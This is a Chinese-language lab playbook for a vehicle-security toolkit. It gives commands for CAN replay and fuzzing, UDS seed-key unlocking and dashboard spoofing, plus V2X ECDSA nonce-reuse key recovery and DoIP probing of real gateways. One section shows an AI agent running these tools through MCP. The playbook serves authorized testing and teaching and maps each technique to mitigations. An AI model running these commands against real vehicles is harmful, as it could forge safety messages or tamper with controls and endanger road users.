# 车联网攻击手册 / Attack Playbook

配套 `vehsec` 的实战流程。**仅用于授权测试、教学与自有车辆。**

## 0. 环境准备

```bash
# Windows / macOS / Linux 无硬件：虚拟总线
export VEHSEC_CAN_IFACE=virtual VEHSEC_CAN_CHANNEL=test

# Linux 真实虚拟车（vcan0 + ICSim + UDSim）
bash scripts/setup_vcan.sh
export VEHSEC_CAN_IFACE=socketcan VEHSEC_CAN_CHANNEL=vcan0
```

## 1. 侦察：抓包与流量基线

```bash
candump -l vcan0                 # 记录基线
vehsec can replay --file candump.log   # 离线重放
```

要点：先建立「正常流量基线」，再用差分找出控制类报文（车门/车速/转向）。

## 2. UDS 服务枚举

```bash
vehsec uds session --level 3      # 进入扩展会话
vehsec uds read --did 0xF190      # 读 VIN
vehsec uds security --level 1 --vendor training_rotate
```

流程：`10 03`（扩展会话）→ `27 01`（取 seed）→ 求解 → `27 02`（发 key）→
`22 F190`（读 DID）。守护型 ECU 会限制错误次数，注意锁死风险。

## 3. Seed-Key 解锁

`vehsec` 用可插拔注册表：

```python
from vehsec import seedkey
seedkey.register("my_algo", lambda s: bytes(b ^ 0x5A for b in s))
```

```bash
vehsec seedkey solve --vendor training_rotate --seed 0102   # -> 585e
vehsec seedkey vendors
```

真实车厂的算法藏在私有 DLL，参考 [UnlockECU](https://github.com/jglim/UnlockECU)。

## 4. CAN 重放与模糊

```bash
vehsec can fuzz --ids 0x1A4,0x19B --rounds 200 --mutate
vehsec can send --id 0x19B --data 00
```

模糊测试观察 ECU 是否进入异常状态（无响应、复位、进入 bootloader）。

## 5. 仪表盘篡改演示（ICSim）

```bash
vehsec icsim speed --kmh 250       # 车速跳转
vehsec icsim turn --dir left       # 转向灯
vehsec icsim demo --kmh 250        # 车速+车门+转向 组合演示
```

对应真实风险：仪表盘显示与车辆真实状态解耦（伪造里程/车速）。

## 6. V2X ECDSA nonce 复用 → 私钥恢复

```bash
python labs/v2x-ecdsa-nonce/solve.py --gen 20 --reuse
vehsec v2x analyze labs/v2x-ecdsa-nonce/signatures.json
```

数学：同一 k 下两条签名 `(r,s1,z1)`、`(r,s2,z2)`
```
k = (z1 - z2) * (s1 - s2)^-1  mod n
d = (s1*k - z1) * r^-1         mod n
```
拿到 d 即可伪造任意合法 CAM/DENM，构成中间人链路。防御：强制 RFC 6979
确定性 nonce。

## 7. 用 AI Agent 驱动（MCP）

把 `examples/mcp-config.json` 加入 Agent 的 MCP 配置并信任，然后直接说：

> "用 vehsec 对虚拟 ECU 做一次 UDS 安全访问，把 seed 和 key 给我。"

可用工具：`can_send`、`can_fuzz`、`can_analyze`、`uds_security_access`、`uds_read_did`、
`seedkey_solve`、`v2x_analyze`、`icsim_set_speed`、`icsim_tamper_demo`、`doip_simulate`、
`doip_probe`、`dbc_decode`、`dbc_info`。

补充手册：

- **DoIP（以太网诊断）**：`vehsec doip simulate` 起一个进程内 DoIP 实体（UDP 发现 +
  TCP UDS），完成「车辆声明 → 路由激活 → 22 F190 读 VIN」全流程；对真实网关用
  `vehsec doip probe --host <ip> --target 0x1000 --service 22F190`。
  侦察要点：路由激活响应码 `0x10` = 成功，`0x11` = 源地址未被识别（先枚举合法
  tester 地址），`0x19` = 需要 TLS。
- **DBC 信号级解码**：`vehsec dbc decode --file x.dbc --id 0x100 --data <hex>`。
  拿到 DBC 等于拿到车辆语义，是重放/篡改前的必做一步；
  `--raw` 看原始整数，`--json` 便于管道处理。

## 威胁建模映射（ISO/SAE 21434 / TARA）

| 手法 | 资产 | 影响等级 | 缓解措施 |
|------|------|----------|----------|
| CAN 重放/注入 | 车身控制 | 高 | SecOC（AUTOSAR 报文认证）、报文计数器 |
| UDS 未授权访问 | 诊断服务 | 高 | 27 服务强算法 + 错误计数锁定 + 0x29 认证 |
| Seed-Key 弱算法 | 刷写权限 | 严重 | 非对称认证、算法保密性评估 |
| V2X nonce 复用 | 消息可信 | 严重 | RFC 6979、HSM 保护私钥 |
| 仪表盘伪造 | 显示完整性 | 中 | 端到端校验、冗余信号交叉验证 |
